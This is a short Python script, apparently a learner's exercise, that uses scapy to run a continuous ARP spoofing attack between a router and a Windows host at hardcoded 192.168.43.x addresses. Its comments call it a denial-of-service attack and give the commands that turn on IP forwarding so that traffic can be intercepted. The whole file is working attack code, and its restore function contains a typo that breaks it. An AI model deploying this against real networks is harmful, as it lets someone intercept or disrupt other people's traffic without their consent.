#!/usr/bin/python

import scapy.all as scapy
#impoerted scapy library


def restore(destination_ip, source_ip):
	target_mac = get_target_mac(destination_ip)
	source_mac = get_target_mac(sorce_ip)
	packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=target_mac, psrc=source_ip, hwsrc=source_mac)
	scapy.send(packet, verbose=False)
#restores the mac address and ip


def get_target_mac(ip):
	arp_request = scapy.ARP(pdst=ip)
	broadcast = scapy.Ether(dst = "ff:ff:ff:ff:ff:ff")
	finalpacket = broadcast/arp_request
	answer = scapy.srp(finalpacket, timeout=2, verbose=False)[0]
	mac = answer[0][1].hwsrc
	return(mac)
#sends and recieves the mac address


def spoof_arp(target_ip,spoofed_ip):
#ip to be targeted and spoofed means the ip we would pretend to be
	mac = get_target_mac(target_ip)
	#to do that we need mac address of target mac 
	packet =scapy.ARP(op=2, hwdst= mac, pdst=target_ip, psrc=spoofed_ip)
	scapy.send(packet, verbose=False)
	#sends the ips for spoofing




def main():
	try:
		while True:
			spoof_arp("192.168.43.1","192.168.43.97")
			spoof_arp("192.168.43.97","192.168.43.1")
			#setting the ip address of windows and router and again reverse

	except KeyboardInterrupt:
		restore("192.168.43.1","192.168.43.97")
		restore("192.168.43.97","192.168.43.1")
		#this restores the ips after running the program
		exit(0)


main()
#this will not allow anyone to access the internet in the local network so type of DOS attack

#command to check portforwarding i.e. not to loose internet connection: cat /proc/sys/net/ipv4/ip_forward
#command to set port forwarding if it's value is 0: echo 1 > /proc/sys/net/ipv4/ip_forward

